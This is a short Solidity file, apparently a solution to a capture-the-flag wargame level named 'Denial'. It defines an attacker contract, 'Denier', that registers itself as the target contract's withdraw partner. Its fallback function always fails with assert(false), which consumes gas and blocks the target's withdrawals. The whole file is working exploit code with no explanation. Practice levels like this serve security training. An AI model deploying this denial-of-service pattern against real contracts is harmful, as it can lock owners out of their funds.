import "./Denial.sol";

pragma solidity ^0.5.0;

contract Denier {
    Denial target;

    constructor(address payable targetAddress) public {
        target = Denial(targetAddress);
    }

    function setWithdrawPartner() external {
        target.setWithdrawPartner(address(this));
    }

    function () external payable {
        assert(false);
    }
}